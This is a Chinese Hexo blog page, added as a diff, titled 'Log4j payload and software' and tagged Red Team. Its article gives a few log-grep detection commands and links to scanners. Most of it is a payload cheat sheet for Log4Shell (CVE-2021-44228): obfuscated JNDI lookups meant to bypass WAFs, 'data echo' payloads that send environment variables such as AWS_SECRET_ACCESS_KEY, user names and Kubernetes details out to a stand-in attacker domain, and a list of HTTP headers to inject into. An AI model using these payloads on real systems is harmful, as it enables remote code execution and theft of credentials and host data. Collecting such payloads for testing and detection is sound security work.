@@ -1,0 +1,925 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next muse use-motion" lang="zh-Hans">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+  
+  
+  
+  
+
+  
+    
+    
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+    
+    
+    <link href="//fonts.googleapis.com/css?family=Lato:300,300italic,400,400italic,700,700italic&subset=latin,latin-ext" rel="stylesheet" type="text/css">
+  
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-3232cloud.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-1616cloud.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/cloud.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="Red Team,payload," />
+
+
+
+
+
+
+
+
+
+
+<meta property="og:type" content="article">
+<meta property="og:title" content="Log4j payload and software">
+<meta property="og:url" content="http://sunyyer.com/2021/12/21/Log4j%20payload%20and%20software/index.html">
+<meta property="og:site_name" content="云">
+<meta property="og:locale">
+<meta property="og:image" content="https://s2.loli.net/2021/12/21/yCrZcNFMiIOz79S.png">
+<meta property="article:published_time" content="2021-12-21T04:11:11.000Z">
+<meta property="article:modified_time" content="2021-12-20T16:19:24.104Z">
+<meta property="article:author" content="sunyyer">
+<meta property="article:tag" content="Red Team">
+<meta property="article:tag" content="payload">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://s2.loli.net/2021/12/21/yCrZcNFMiIOz79S.png">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '',
+    scheme: 'Muse',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":true,"scrollpercent":true,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://sunyyer.com/2021/12/21/Log4j payload and software/"/>
+
+
+
+
+
+  <title>Log4j payload and software | 云</title>
+  
+
+
+
+
+
+
+
+
+<meta name="generator" content="Hexo 5.4.0"></head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">云</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle">雨声潺潺,像住在溪边,宁愿天天下雨,以为你是下雨不来</p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br />
+            
+            关于
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
+            
+            标签
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br />
+            
+            分类
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            归档
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://sunyyer.com/2021/12/21/Log4j%20payload%20and%20software/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="云">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">Log4j payload and software</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2021-12-21T12:11:11+08:00">
+                2021-12-21
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E6%8A%80%E6%9C%AF/" itemprop="url" rel="index">
+                    <span itemprop="name">技术</span>
+                  </a>
+                </span>
+
+                
+                
+                  ， 
+                
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E6%8A%80%E6%9C%AF/%E6%BC%8F%E6%B4%9E/" itemprop="url" rel="index">
+                    <span itemprop="name">漏洞</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+              <span class="post-comments-count">
+                <span class="post-meta-divider">|</span>
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-comment-o"></i>
+                </span>
+                <a href="/2021/12/21/Log4j%20payload%20and%20software/#comments" itemprop="discussionUrl">
+                  <span class="post-comments-count valine-comment-count" data-xid="/2021/12/21/Log4j%20payload%20and%20software/" itemprop="commentCount"></span>
+                </a>
+              </span>
+            
+          
+
+          
+          
+
+          
+            <span class="post-meta-divider">|</span>
+            <span class="page-pv"><i class="fa fa-file-o"></i>
+            <span class="busuanzi-value" id="busuanzi_value_page_pv" ></span>
+            </span>
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <p><img src="https://s2.loli.net/2021/12/21/yCrZcNFMiIOz79S.png" alt="wallhaven-dpv7km_1280x720.png"></p>
+<span id="more"></span>
+
+<h1 id="About"><a href="#About" class="headerlink" title="About"></a>About</h1><p>更多关于该漏洞的信息可以查看该项目，由世界各地的成员维护： <a target="_blank" rel="noopener" href="https://note.youdao.com/">https://github.com/NCSC-NL/log4shell</a></p>
+<h1 id="速查"><a href="#速查" class="headerlink" title="速查"></a>速查</h1><p>linux</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">find / -name &quot;*.log&quot; -exec grep &quot;\$&#123;jndi:ldap\|\$&#123;\$&#123;::-j&#125;\|\$&#123;jndi:rmi\|\$&#123;\$&#123;lower:jndi&#125;\|\$&#123;\$&#123;lower\:j&#125;\$&#123;lower:n&#125;\|\$&#123;\$&#123;lower:j&#125;\$&#123;upper:n&#125;\|\$&#123;\$&#123;lower:\$&#123;lower:jndi&#125;&#125;:&quot; &#123;&#125; -n -H --color \;</span><br><span class="line">detect zip file</span><br><span class="line">sudo find / -name \*.gz -print0 | xargs -0 zgrep -E -i &#x27;\$(\&#123;|%7B)jndi:(ldap[s]?|rmi|dns|nis|iiop|corba|nds|http):/[^\n]+&#x27;</span><br><span class="line">Software</span><br></pre></td></tr></table></figure>
+<h1 id="检测软件推荐"><a href="#检测软件推荐" class="headerlink" title="检测软件推荐"></a>检测软件推荐</h1><p> 各有优劣和不足吧，看自己需要哪种</p>
+<table>
+<thead>
+<tr>
+<th>LINK Address</th>
+<th>Soucre    Name</th>
+<th>Type</th>
+<th>details</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><a target="_blank" rel="noopener" href="https://note.youdao.com/">https://github.com/logpresso/CVE-2021-44228-Scanner</a></td>
+<td>github</td>
+<td>log4j2j-scan</td>
+<td>script</td>
+</tr>
+<tr>
+<td><a target="_blank" rel="noopener" href="https://note.youdao.com/">https://log4j2-detector.chaitin.cn/</a></td>
+<td>chaitin/长亭</td>
+<td>log4j2_local_scanner_linux_amd64.v3</td>
+<td>script</td>
+</tr>
+<tr>
+<td></td>
+<td><a target="_blank" rel="noopener" href="https://note.youdao.com/">https://github.com/fullhunt/log4j-scan</a></td>
+<td>github</td>
+<td>logej-scan</td>
+</tr>
+<tr>
+<td></td>
+<td><a target="_blank" rel="noopener" href="https://github.com/Neo23x0/log4shell-detector">https://github.com/Neo23x0/log4shell-detector</a></td>
+<td>github</td>
+<td>log4shell-detector</td>
+</tr>
+<tr>
+<td></td>
+<td><a target="_blank" rel="noopener" href="https://github.com/webraybtl/Log4j">https://github.com/webraybtl/Log4j</a></td>
+<td>github/webray</td>
+<td>log4j2_detect2.0</td>
+</tr>
+<tr>
+<td></td>
+<td><a target="_blank" rel="noopener" href="https://yunpan.360.cn/surl_ykykpBsDYeH">https://yunpan.360.cn/surl_ykykpBsDYeH</a></td>
+<td>360</td>
+<td>log4j-discoverer</td>
+</tr>
+</tbody></table>
+<p>log4j2-scan</p>
+<p>log4j2_local_scanner_linux_amd64.v3</p>
+<p>log4shell-detector</p>
+<p>log4j2_detect2.0</p>
+<p>log4j-discoverer</p>
+<h1 id="Payload"><a href="#Payload" class="headerlink" title="Payload"></a>Payload</h1><p><strong>==cross waf payload==</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">$&#123;jndi:ldap://domain.com/j&#125;</span><br><span class="line">$&#123;jndi:ldap:/domain.com/a&#125;</span><br><span class="line">$&#123;jndi:dns:/domain.com&#125;</span><br><span class="line">$&#123;jndi:dns://domain.com/j&#125;</span><br><span class="line">$&#123;$&#123;::-j&#125;$&#123;::-n&#125;$&#123;::-d&#125;$&#123;::-i&#125;:$&#123;::-r&#125;$&#123;::-m&#125;$&#123;::-i&#125;://domain.com/j&#125;</span><br><span class="line">$&#123;$&#123;::-j&#125;ndi:rmi://domain.com/j&#125;</span><br><span class="line">$&#123;jndi:rmi://domainldap.com/j&#125;</span><br><span class="line">$&#123;$&#123;lower:jndi&#125;:$&#123;lower:rmi&#125;://domain.com/j&#125;</span><br><span class="line">$&#123;$&#123;lower:$&#123;lower:jndi&#125;&#125;:$&#123;lower:rmi&#125;://domain.com/j&#125;</span><br><span class="line">$&#123;$&#123;lower:j&#125;$&#123;lower:n&#125;$&#123;lower:d&#125;i:$&#123;lower:rmi&#125;://domain.com/j&#125;</span><br><span class="line">$&#123;$&#123;lower:j&#125;$&#123;upper:n&#125;$&#123;lower:d&#125;$&#123;upper:i&#125;:$&#123;lower:r&#125;m$&#123;lower:i&#125;&#125;://domain.com/j&#125;</span><br><span class="line">$&#123;jndi:$&#123;lower:l&#125;$&#123;lower:d&#125;a$&#123;lower:p&#125;://domain.com&#125;</span><br><span class="line">$&#123;$&#123;env:NaN:-j&#125;ndi$&#123;env:NaN:-:&#125;$&#123;env:NaN:-l&#125;dap$&#123;env:NaN:-:&#125;//domain.com/a&#125;</span><br><span class="line">jn$&#123;env::-&#125;di:</span><br><span class="line">jn$&#123;date:&#125;di$&#123;date:&#x27;:&#x27;&#125;</span><br><span class="line">j$&#123;k8s:k5:-ND&#125;i$&#123;sd:k5:-:&#125;</span><br><span class="line">j$&#123;main:\k5:-Nd&#125;i$&#123;spring:k5:-:&#125;</span><br><span class="line">j$&#123;sys:k5:-nD&#125;$&#123;lower:i$&#123;web:k5:-:&#125;&#125;</span><br><span class="line">j$&#123;::-nD&#125;i$&#123;::-:&#125;</span><br><span class="line">j$&#123;EnV:K5:-nD&#125;i:</span><br><span class="line">j$&#123;loWer:Nd&#125;i$&#123;uPper::&#125;</span><br><span class="line">$&#123;$&#123;env:ENV_NAME:-j&#125;ndi$&#123;env:ENV_NAME:-:&#125;$&#123;env:ENV_NAME:-l&#125;dap$&#123;env:ENV_NAME:-:&#125;//domain.com/z&#125;</span><br><span class="line">$&#123;$&#123;::-j&#125;$&#123;::-n&#125;$&#123;::-d&#125;$&#123;::-i&#125;:$&#123;::-l&#125;$&#123;::-d&#125;$&#123;::-a&#125;$&#123;::-p&#125;://domin.com/z&#125;</span><br><span class="line">$&#123;j$&#123;$&#123;:-l&#125;$&#123;:-o&#125;$&#123;:-w&#125;$&#123;:-e&#125;$&#123;:-r&#125;:n&#125;di:ldap://somesitehackerofhell.com/z&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<p><strong>==data echo==</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line">$&#123;jndi:ldap://$&#123;env:user&#125;.domain.com/exp&#125;</span><br><span class="line">$&#123;jndi:dns://$&#123;hostName&#125;.domain.com/a&#125;</span><br><span class="line">$&#123;jndi:dns://$&#123;env:COMPUTERNAME&#125;.domain.com/a&#125;</span><br><span class="line">$&#123;jndi:dns://$&#123;env:USERDOMAIN&#125;.domain.com/a&#125;</span><br><span class="line">$&#123;jndi:dns://$&#123;env:AWS_SECRET_ACCESS_KEY.domain.com/a&#125;</span><br><span class="line">$&#123;jndi:ldap://$&#123;ctx:loginId&#125;.domain.com/j&#125;</span><br><span class="line">$&#123;jndi:ldap://$&#123;map:type&#125;.domain.com/j&#125;</span><br><span class="line">$&#123;jndi:ldap://$&#123;filename&#125;.domain.com/j&#125;</span><br><span class="line">$&#123;jndi:ldap://$&#123;date:MM-dd-yyyy&#125;.domain.com/j&#125;</span><br><span class="line">$&#123;jndi:ldap://$&#123;docker:containerId&#125;.domain.com/j&#125;</span><br><span class="line">$&#123;jndi:ldap://$&#123;docker:containerName&#125;.domain.com/j&#125;</span><br><span class="line">$&#123;jndi:ldap://$&#123;docker:imageName&#125;.domain.com/j&#125;</span><br><span class="line">$&#123;jndi:ldap://$&#123;env:USER&#125;.domain.com/j&#125;</span><br><span class="line">$&#123;jndi:ldap://$&#123;event:Marker&#125;.domain.com/j&#125;</span><br><span class="line">$&#123;jndi:ldap://$&#123;mdc:UserId&#125;.domain.com/j&#125;</span><br><span class="line">$&#123;jndi:ldap://$&#123;java:runtime&#125;.domain.com/j&#125;</span><br><span class="line">$&#123;jndi:ldap://$&#123;java:vm&#125;.domain.com/j&#125;</span><br><span class="line">$&#123;jndi:ldap://$&#123;java:os&#125;.domain.com/j&#125;</span><br><span class="line">$&#123;jndi:ldap://$&#123;jndi:logging/context-name&#125;.domain.com/j&#125;</span><br><span class="line">$&#123;jndi:ldap://$&#123;hostName&#125;.domain.com/j&#125;</span><br><span class="line">$&#123;jndi:ldap://$&#123;docker:containerId&#125;.domain.com/j&#125;</span><br><span class="line">$&#123;jndi:ldap://$&#123;k8s:accountName&#125;.domain.com/j&#125;</span><br><span class="line">$&#123;jndi:ldap://$&#123;k8s:clusterName&#125;.domain.com/j&#125;</span><br><span class="line">$&#123;jndi:ldap://$&#123;k8s:containerId&#125;.domain.com/j&#125;</span><br><span class="line">$&#123;jndi:ldap://$&#123;k8s:containerName&#125;.domain.com/j&#125;</span><br><span class="line">$&#123;jndi:ldap://$&#123;k8s:host&#125;.domain.com/j&#125;</span><br><span class="line">$&#123;jndi:ldap://$&#123;k8s:labels.app&#125;.domain.com/j&#125;</span><br><span class="line">$&#123;jndi:ldap://$&#123;k8s:labels.podTemplateHash&#125;.domain.com/j&#125;</span><br><span class="line">$&#123;jndi:ldap://$&#123;k8s:masterUrl&#125;.domain.com/j&#125;</span><br><span class="line">$&#123;jndi:ldap://$&#123;k8s:namespaceId&#125;.domain.com/j&#125;</span><br><span class="line">$&#123;jndi:ldap://$&#123;k8s:namespaceName&#125;.domain.com/j&#125;</span><br><span class="line">$&#123;jndi:ldap://$&#123;k8s:podId&#125;.domain.com/j&#125;</span><br><span class="line">$&#123;jndi:ldap://$&#123;k8s:podIp&#125;.domain.com/j&#125;</span><br><span class="line">$&#123;jndi:ldap://$&#123;k8s:podName&#125;.domain.com/j&#125;</span><br><span class="line">$&#123;jndi:ldap://$&#123;k8s:imageId&#125;.domain.com/j&#125;</span><br><span class="line">$&#123;jndi:ldap://$&#123;k8s:imageName&#125;.domain.com/j&#125;</span><br><span class="line">$&#123;jndi:ldap://$&#123;log4j:configLocation&#125;.domain.com/j&#125;</span><br><span class="line">$&#123;jndi:ldap://$&#123;log4j:configParentLocation&#125;.domain.com/j&#125;</span><br><span class="line">$&#123;jndi:ldap://$&#123;spring:spring.application.name&#125;.domain.com/j&#125;</span><br><span class="line">$&#123;jndi:ldap://$&#123;main:myString&#125;.domain.com/j&#125;</span><br><span class="line">$&#123;jndi:ldap://$&#123;main:0&#125;.domain.com/j&#125;</span><br><span class="line">$&#123;jndi:ldap://$&#123;main:1&#125;.domain.com/j&#125;</span><br><span class="line">$&#123;jndi:ldap://$&#123;main:2&#125;.domain.com/j&#125;</span><br><span class="line">$&#123;jndi:ldap://$&#123;main:3&#125;.domain.com/j&#125;</span><br><span class="line">$&#123;jndi:ldap://$&#123;main:4&#125;.domain.com/j&#125;</span><br><span class="line">$&#123;jndi:ldap://$&#123;main:bar&#125;.domain.com/j&#125;</span><br><span class="line">$&#123;jndi:ldap://$&#123;name&#125;.domain.com/j&#125;</span><br><span class="line">$&#123;jndi:ldap://$&#123;marker&#125;.domain.com/j&#125;</span><br><span class="line">$&#123;jndi:ldap://$&#123;marker:name&#125;.domain.com/j&#125;</span><br><span class="line">$&#123;jndi:ldap://$&#123;spring:profiles.active[0].domain.com/j&#125;</span><br><span class="line">$&#123;jndi:ldap://$&#123;sys:logPath&#125;.domain.com/j&#125;</span><br><span class="line">$&#123;jndi:ldap://$&#123;web:rootDir&#125;.domain.com/j&#125;</span><br></pre></td></tr></table></figure>
+
+
+<p><strong>==check flags head==</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><span class="line">Accept-Charset</span><br><span class="line">Accept-Datetime</span><br><span class="line">Accept-Encoding</span><br><span class="line">Accept-Language</span><br><span class="line">Authorization</span><br><span class="line">Cache-Control</span><br><span class="line">Cf-Connecting_ip</span><br><span class="line">Client-Ip</span><br><span class="line">Contact</span><br><span class="line">Cookie</span><br><span class="line">DNT</span><br><span class="line">Forwarded</span><br><span class="line">Forwarded-For</span><br><span class="line">Forwarded-For-Ip</span><br><span class="line">Forwarded-Proto</span><br><span class="line">From</span><br><span class="line">If-Modified-Since</span><br><span class="line">Max-Forwards</span><br><span class="line">Origin</span><br><span class="line">Originating-Ip</span><br><span class="line">Pragma</span><br><span class="line">Referer</span><br><span class="line">TE</span><br><span class="line">True-Client-IP</span><br><span class="line">True-Client-Ip</span><br><span class="line">Upgrade</span><br><span class="line">User-Agent</span><br><span class="line">Via</span><br><span class="line">Warning</span><br><span class="line">X-ATT-DeviceId</span><br><span class="line">X-Api-Version</span><br><span class="line">X-Att-Deviceid</span><br><span class="line">X-CSRFToken</span><br><span class="line">X-Client-Ip</span><br><span class="line">X-Correlation-ID</span><br><span class="line">X-Csrf-Token</span><br><span class="line">X-Do-Not-Track</span><br><span class="line">X-Foo</span><br><span class="line">X-Foo-Bar</span><br><span class="line">X-Forward-For</span><br><span class="line">X-Forward-Proto</span><br><span class="line">X-Forwarded</span><br><span class="line">X-Forwarded-By</span><br><span class="line">X-Forwarded-For</span><br><span class="line">X-Forwarded-For-Original</span><br><span class="line">X-Forwarded-Host</span><br><span class="line">X-Forwarded-Port</span><br><span class="line">X-Forwarded-Proto</span><br><span class="line">X-Forwarded-Protocol</span><br><span class="line">X-Forwarded-Scheme</span><br><span class="line">X-Forwarded-Server</span><br><span class="line">X-Forwarded-Ssl</span><br><span class="line">X-Forwarder-For</span><br><span class="line">X-Frame-Options</span><br><span class="line">X-From</span><br><span class="line">X-Geoip-Country</span><br><span class="line">X-HTTP-Method-Override</span><br><span class="line">X-Http-Destinationurl</span><br><span class="line">X-Http-Host-Override</span><br><span class="line">X-Http-Method</span><br><span class="line">X-Http-Method-Override</span><br><span class="line">X-Http-Path-Override</span><br><span class="line">X-Https</span><br><span class="line">X-Htx-Agent</span><br><span class="line">X-Hub-Signature</span><br><span class="line">X-If-Unmodified-Since</span><br><span class="line">X-Imbo-Test-Config</span><br><span class="line">X-Insight</span><br><span class="line">X-Ip</span><br><span class="line">X-Ip-Trail</span><br><span class="line">X-Leakix</span><br><span class="line">X-Originating-Ip</span><br><span class="line">X-ProxyUser-Ip</span><br><span class="line">X-Real-Ip</span><br><span class="line">X-Remote-Addr</span><br><span class="line">X-Remote-Ip</span><br><span class="line">X-Request-ID</span><br><span class="line">X-Requested-With</span><br><span class="line">X-UIDH</span><br><span class="line">X-Wap-Profile</span><br><span class="line">X-XSRF-TOKEN</span><br><span class="line">Authorization: Basic </span><br><span class="line">Authorization: Bearer </span><br><span class="line">Authorization: Oauth </span><br><span class="line">Authorization: Token</span><br></pre></td></tr></table></figure>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+      <div>
+        <ul class="post-copyright">
+  <li class="post-copyright-author">
+    <strong>本文作者：</strong>
+    sunyyer
+  </li>
+  <li class="post-copyright-link">
+    <strong>本文链接：</strong>
+    <a href="http://sunyyer.com/2021/12/21/Log4j%20payload%20and%20software/" title="Log4j payload and software">http://sunyyer.com/2021/12/21/Log4j%20payload%20and%20software/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>版权声明： </strong>
+    本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/3.0/" rel="external nofollow" target="_blank">CC BY-NC-SA 3.0</a> 许可协议。转载请注明出处！
+  </li>
+</ul>
+
+      </div>
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/Red-Team/" rel="tag"># Red Team</a>
+          
+            <a href="/tags/payload/" rel="tag"># payload</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2021/11/03/%E7%BA%A2%E9%98%9F%E6%94%BB%E5%87%BB%E6%B5%81%E7%A8%8B%E4%B8%8E%E6%8A%80%E6%9C%AF%E7%BB%86%E8%B0%88/" rel="next" title="红队技术">
+                <i class="fa fa-chevron-left"></i> 红队技术
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+    <div class="comments" id="comments">
+    </div>
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <p class="site-author-name" itemprop="name"></p>
+              <p class="site-description motion-element" itemprop="description"></p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/%7C%7C%20archive">
+              
+                  <span class="site-state-item-count">11</span>
+                  <span class="site-state-item-name">日志</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-categories">
+                <a href="/categories/index.html">
+                  <span class="site-state-item-count">10</span>
+                  <span class="site-state-item-name">分类</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
